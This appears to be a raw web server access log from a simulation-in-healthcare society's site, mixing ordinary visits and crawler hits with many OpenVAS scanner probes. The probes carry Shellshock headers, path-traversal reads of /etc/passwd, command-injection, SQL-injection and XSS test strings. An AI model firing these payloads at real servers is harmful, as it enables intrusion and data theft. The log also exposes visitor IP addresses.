188.238.107.243 - - [08/Nov/2017:08:20:19 +0000] "GET /centres/centre/stavanger-acute-medicine-foundation-for-education-and-research/ HTTP/1.1" 200 20611 "http://www.google.fi/" "Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"
106.120.173.64 - - [07/Nov/2017:18:24:47 +0000] "GET / HTTP/1.1" 200 30985 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
51.255.71.98 - - [05/Nov/2017:23:29:29 +0000] "GET /centres/centre/simulations-notfallakademie-am-helios-klinikum-krefeld-sina/ HTTP/1.1" 200 20597 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
217.9.204.106 - - [07/Nov/2017:09:58:50 +0000] "POST /autodiscover/autodiscover.xml HTTP/1.1" 403 5676 "-" "MacOutlook/15.39.0.171010 (Intelx64 Mac OS X Version 10.13.1 (Build 17B48))"
217.64.42.218 - - [08/Nov/2017:04:34:56 +0000] "GET /links/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:21 +0000] "OPTIONS /scripts/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
147.230.61.83 - - [08/Nov/2017:13:04:19 +0000] "GET /membership/ HTTP/1.1" 200 15294 "https://www.sesam-web.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
217.64.42.218 - - [08/Nov/2017:04:40:27 +0000] "GET /cms/modules/profile/user.php?aXconf[default_language]=../../../../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
198.143.2.117 - - [06/Nov/2017:16:10:20 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:50:46 +0000] "GET /cgi-bin/sysinfo.pl HTTP/1.1" 404 6026 "-" "-"
207.46.13.198 - - [08/Nov/2017:06:35:18 +0000] "GET /robots.txt HTTP/1.1" 200 24887 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:48:22 +0000] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 6025 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:35:21 +0000] "GET /scripts/vpasswd.cgi_2059186271 HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
83.247.136.54 - - [06/Nov/2017:09:03:52 +0000] "GET /events/pages/sesam-barcelona-2018/Submission-of-abstracts-2018/ HTTP/1.1" 200 27212 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
157.55.39.58 - - [06/Nov/2017:00:25:24 +0000] "GET /meetings/ HTTP/1.1" 200 20571 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
49.207.185.128 - - [09/Nov/2017:10:39:12 +0000] "POST / HTTP/1.1" 403 469 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)"
197.245.101.120 - - [08/Nov/2017:19:39:53 +0000] "GET /events/pages/sesam-barcelona-2018/Conference-Venue-2018/ HTTP/1.1" 200 17520 "https://www.sesam-web.org/events/pages/sesam-barcelona-2018/Dates-and-Deadlines-20181/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:40:14 +0000] "GET /Atutor/AContent/home/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
193.163.223.68 - - [06/Nov/2017:12:30:15 +0000] "POST /members/register/ HTTP/1.1" 302 6093 "https://www.sesam-web.org/members/register/?next=/abstracts/submitabstract/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:34:34 +0000] "GET /cgi-bin/php/login.php HTTP/1.1" 500 861 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:27 +0000] "GET /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1" 404 570 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
185.94.60.201 - - [07/Nov/2017:12:15:25 +0000] "GET /centres/centre.json?slug=simulation-centre-on-cardiac-electrophysiology HTTP/1.1" 200 1113 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:36:46 +0000] "GET /cgi-bin/.git/info/exclude HTTP/1.1" 404 581 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
198.23.230.217 - - [05/Nov/2017:11:00:56 +0000] "GET / HTTP/1.1" 403 5833 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8"
217.64.42.218 - - [08/Nov/2017:04:38:01 +0000] "GET /core/orionSplashScreen.do HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.58 - - [08/Nov/2017:02:38:55 +0000] "GET /centres/centre/case-centre-of-advanced-simulation-and-education/ HTTP/1.1" 200 17511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:41:35 +0000] "GET /actualanalyzer/admin.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
212.133.241.172 - - [09/Nov/2017:10:45:01 +0000] "GET /favicon.ico HTTP/1.1" 200 7163 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
217.64.42.218 - - [08/Nov/2017:04:39:36 +0000] "GET /scripts/interface/logon.do HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
134.174.21.158 - - [07/Nov/2017:15:26:41 +0000] "GET /abstracts/editabstract/852/ HTTP/1.1" 200 29013 "https://www.sesam-web.org/abstracts/mysubmissions/sesam-barcelona-2018/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
50.233.135.130 - - [08/Nov/2017:17:26:09 +0000] "GET / HTTP/1.1" 200 31005 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52"
217.64.42.218 - - [08/Nov/2017:04:39:19 +0000] "GET /scripts/php-files/news.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:54 +0000] "GET /search/searchblox/search.html HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
175.156.142.200 - - [09/Nov/2017:00:10:22 +0000] "GET /events/event/sesam-barcelona-2018/ HTTP/1.1" 200 22460 "https://www.google.com.sg/" "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:39:48 +0000] "GET /phpldapadmin/index.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:21 +0000] "OPTIONS /scripts/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:54 +0000] "GET /cgi-bin/fm.php HTTP/1.1" 404 570 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [06/Nov/2017:02:08:06 +0000] "GET /events/pages/sesam-paris-2017/confirmed-exhibitors/www.gaumard.com HTTP/1.1" 404 12361 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.66 - - [08/Nov/2017:02:40:18 +0000] "GET /news/aspe-news-december-2014/ HTTP/1.1" 200 23939 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:47:36 +0000] "POST /cgi-bin/test.cgi.php HTTP/1.1" 404 6028 "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;" "-"
49.207.185.128 - - [09/Nov/2017:08:20:14 +0000] "POST / HTTP/1.1" 403 469 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)"
217.64.42.218 - - [08/Nov/2017:04:41:10 +0000] "GET /sapid/usr/extensions/get_tree.inc.php?GLOBALS[root_path]=/etc/passwd%00 HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
82.132.240.120 - - [06/Nov/2017:16:06:25 +0000] "GET /events/pages/sesam-paris-2017/abstractlisting/ HTTP/1.1" 200 27909 "https://www.google.co.uk/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
207.46.13.66 - - [08/Nov/2017:02:39:52 +0000] "GET /events/event/sesam-paris-2017/ HTTP/1.1" 200 29085 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.66 - - [06/Nov/2017:02:08:41 +0000] "GET /news/sesam-newsletter-february-2017/ HTTP/1.1" 200 38291 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
68.180.229.225 - - [07/Nov/2017:18:18:04 +0000] "GET /accreditation/ HTTP/1.1" 200 21234 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
157.55.39.58 - - [05/Nov/2017:13:48:38 +0000] "GET /news/season-greetings-sesam/ HTTP/1.1" 200 20803 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:37:02 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [08/Nov/2017:02:38:57 +0000] "GET /centres/centre/antalya-health-directorate-region-training-research-and-simulation-centre/ HTTP/1.1" 200 15070 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
195.188.112.100 - - [08/Nov/2017:00:57:38 +0000] "GET /favicon.ico HTTP/1.1" 200 1507 "https://www.sesam-web.org/" "Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36"
157.55.39.110 - - [06/Nov/2017:02:08:08 +0000] "GET /centres/centre/scottish-centre-for-simulation-and-clinical-human-factors/ HTTP/1.1" 200 15688 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
80.211.140.235 - - [07/Nov/2017:01:39:59 +0000] "GET /app/etc/local.xml HTTP/1.1" 403 5866 "-" "HTTP_Request2/2.3.0 (http://pear.php.net/package/http_request2) PHP/5.3.3"
217.64.42.218 - - [08/Nov/2017:04:50:55 +0000] "POST /cgi-bin/pathtest.pl HTTP/1.1" 404 6027 "-" "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;"
217.64.42.218 - - [08/Nov/2017:04:49:48 +0000] "GET /cgi-bin/hi HTTP/1.1" 404 6018 "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;" "-"
217.64.42.218 - - [08/Nov/2017:04:34:01 +0000] "GET /snews/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:55 +0000] "GET /kiva/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:46 +0000] "GET /scripts/.ssh/id_ecdsa.pub HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:00 +0000] "GET /sNews/readme.txt HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
66.249.69.40 - - [09/Nov/2017:05:18:12 +0000] "GET /apple-app-site-association HTTP/1.1" 403 5887 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.64.42.218 - - [08/Nov/2017:04:38:25 +0000] "OPTIONS /scripts/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:15 +0000] "GET /typo3/typo3_src/ChangeLog HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:24 +0000] "GET /sgdynamo.exe?HTNAME=sgdynamo.exe HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.58 - - [08/Nov/2017:02:38:56 +0000] "GET /centres/centre/simnova/ HTTP/1.1" 200 17831 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:38:12 +0000] "GET /APG/info/about HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
194.126.31.22 - - [05/Nov/2017:12:15:54 +0000] "GET /favicon.ico HTTP/1.1" 200 1507 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Linux; Android 7.0; SM-G950F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:34:04 +0000] "GET /XSL/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
37.209.27.101 - - [07/Nov/2017:14:12:56 +0000] "GET /centres/centre.json?slug=clinical-skills-lab-of-the-faculty-of-health-sciences-of-the-university-of-beira-interior HTTP/1.1" 200 2451 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
217.64.42.218 - - [08/Nov/2017:04:37:29 +0000] "GET /squirrel/src/login.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:31 +0000] "GET /cgi-bin/index.html HTTP/1.1" 404 574 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.231.32.252 - - [06/Nov/2017:19:05:09 +0000] "GET /events/pages/sesam-barcelona-2018/about-barcelona/ HTTP/1.1" 200 21375 "https://www.sesam-web.org/events/pages/sesam-barcelona-2018/Conference-Venue-2018/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7"
157.55.39.110 - - [06/Nov/2017:02:08:10 +0000] "GET /) HTTP/1.1" 404 12361 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:39:39 +0000] "GET /phpbt/index.php HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
94.197.121.69 - - [08/Nov/2017:14:38:49 +0000] "POST /accounts/login/ HTTP/1.1" 200 14893 "https://www.sesam-web.org/accounts/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12"
217.64.42.218 - - [08/Nov/2017:04:50:49 +0000] "POST /cgi-bin/sysinfo.pl HTTP/1.1" 404 6026 "-" "-"
168.1.128.36 - - [08/Nov/2017:22:13:09 +0000] "GET / HTTP/1.1" 403 5632 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:39:36 +0000] "GET /web/?wicket:bookmarkablePage=:org.geoserver.web.AboutGeoServerPage HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:02 +0000] "GET /posh/portal/login.php?message=XSS%20Catched%20!%22))%3C/script%3E%3Cscript%3Ealert(/openvas-xss-test/)%3C/script%3E HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
66.249.69.33 - - [09/Nov/2017:04:59:04 +0000] "GET /apple-app-site-association HTTP/1.1" 403 5871 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.92 - - [06/Nov/2017:16:35:23 +0000] "GET / HTTP/1.1" 403 6313 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
187.32.203.60 - - [07/Nov/2017:19:15:55 +0000] "GET /abstracts/mysubmissions/sesam-barcelona-2018/ HTTP/1.1" 200 18032 "https://www.sesam-web.org/abstracts/submitabstract/sesam-barcelona-2018/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:33:53 +0000] "GET /vGQEdcpMXwKR.inc HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
109.132.75.39 - - [08/Nov/2017:14:19:22 +0000] "GET /abstracts/submitabstract/sesam-barcelona-2018/ HTTP/1.1" 200 30619 "https://www.sesam-web.org/accounts/login/?next=/abstracts/submitabstract/sesam-barcelona-2018/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
52.50.77.132 - - [09/Nov/2017:01:49:00 +0000] "GET /accreditation/ HTTP/1.1" 200 21214 "-" "Mozilla/5.0 (Windows NT 5.1; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
217.64.42.218 - - [08/Nov/2017:04:35:08 +0000] "GET /phpimageview/ HTTP/1.1" 403 354 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
84.109.137.242 - - [05/Nov/2017:22:06:49 +0000] "GET /robots.txt HTTP/1.1" 200 24600 "-" "null"
217.118.79.37 - - [07/Nov/2017:08:06:39 +0000] "GET /centres/centre.json?slug=centro-de-simulacion-facultad-de-medicina-navarra HTTP/1.1" 200 1786 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A432 Safari/604.1"
207.46.13.45 - - [08/Nov/2017:19:09:08 +0000] "GET /robots.txt HTTP/1.1" 200 24887 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:38:44 +0000] "GET /scripts/news/admin/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
62.193.58.201 - - [09/Nov/2017:09:40:24 +0000] "GET /favicon.ico HTTP/1.1" 200 1645 "https://www.sesam-web.org/events/event/sesam-barcelona-2018/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
193.163.223.68 - - [06/Nov/2017:12:43:07 +0000] "POST /abstracts/editabstract/844/ HTTP/1.1" 302 447 "https://www.sesam-web.org/abstracts/editabstract/844/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:39:59 +0000] "GET /multicms/index.php?lng=../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:11 +0000] "GET /scripts/mod.php?mod=publisher&op=allmedia&artid=-1%20union%20select%200x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:34:00 +0000] "GET /GXApp/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:42 +0000] "GET //%3f.jsp HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
5.9.112.6 - - [09/Nov/2017:01:28:26 +0000] "GET /initiatives/literaryhighlights/ HTTP/1.1" 200 28291 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0"
217.64.42.218 - - [08/Nov/2017:04:46:29 +0000] "GET /cgi-bin/php-cgi HTTP/1.1" 404 6023 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:40:24 +0000] "GET /wiki/index.php?page=/etc/passwd HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:41:34 +0000] "GET /interworx/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [08/Nov/2017:17:38:04 +0000] "GET /centres/centre/simulation-training-centre-of-pfur/ HTTP/1.1" 200 22782 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:34:33 +0000] "GET /demos/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:56 +0000] "GET /webftp/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:38:38 +0000] "GET /scripts/admin/login.html HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:39:58 +0000] "GET /scripts/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:14 +0000] "GET /scripts/search.php?s=%3Cscript%3Ealert(%27openvas-xss-test%27)%3C/script%3E HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
207.46.13.66 - - [08/Nov/2017:02:40:19 +0000] "GET /centres/centre/emergency-services-college-section-of-prehospital-emergency-medical-care/ HTTP/1.1" 200 16094 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
169.54.233.118 - - [09/Nov/2017:10:38:42 +0000] "GET / HTTP/1.1" 403 5632 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:40:37 +0000] "GET /modules/plain/adminpart/addplain.php?module=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
109.25.142.57 - - [07/Nov/2017:21:48:50 +0000] "GET /centres/centre.json?slug=medical-education-simulation-hub-mesh-the-mid-yorkshire-nhs-trust HTTP/1.1" 200 2213 "https://www.sesam-web.org/centres/map/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
217.64.42.218 - - [08/Nov/2017:04:40:29 +0000] "GET /phpwebthings/core/editor.php?editor_insert_bottom=/etc/passwd HTTP/1.1" 403 5844 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:50:51 +0000] "GET /cgi-bin/sysinfo.pl HTTP/1.1" 404 6026 "() { _; OpenVAS; } >_[$($())] {  echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }" "-"
217.64.42.218 - - [08/Nov/2017:04:38:27 +0000] "OPTIONS /scripts/ HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:40:00 +0000] "GET /cms/index.php?lng=../../../../../../../../../etc/passwd%00 HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:42:39 +0000] "GET /status HTTP/1.1" 403 5814 "-" "-"
217.64.42.218 - - [08/Nov/2017:04:41:34 +0000] "GET /scripts/star57.cgi?download=;id| HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:36:13 +0000] "GET /cgi-bin/ HTTP/1.1" 403 568 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:35:21 +0000] "GET /mdb-database/aeNovo1.mdb HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:43:38 +0000] "POST /test_cgi.php HTTP/1.1" 403 5807 "-" "() { OpenVAS:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;"
157.55.39.58 - - [08/Nov/2017:02:38:58 +0000] "GET /news/sesam-newsletter-january-2017/ HTTP/1.1" 200 33381 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
217.64.42.218 - - [08/Nov/2017:04:41:29 +0000] "GET /cgi-bin/index.php??p=../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 573 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
66.249.64.154 - - [06/Nov/2017:23:29:23 +0000] "GET /ads.txt HTTP/1.1" 403 5871 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.64.42.218 - - [08/Nov/2017:04:38:43 +0000] "GET /PHPSurveyor/index.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
217.64.42.218 - - [08/Nov/2017:04:37:40 +0000] "GET /foswiki/bin/view/foswiki/WebHome HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
157.55.39.110 - - [06/Nov/2017:02:08:07 +0000] "GET /events/pages/sesam-paris-2017/Terms-and-Conditions/ HTTP/1.1" 200 26095 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.66 - - [06/Nov/2017:19:32:58 +0000] "GET /events/event/sesam-lisbon/ HTTP/1.1" 200 17856 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.75.31 - - [08/Nov/2017:14:39:31 +0000] "GET /robots.txt HTTP/1.1" 200 24714 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
217.64.42.218 - - [08/Nov/2017:04:37:24 +0000] "GET /wp-links-opml.php HTTP/1.1" 403 355 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS 8.0.9)"
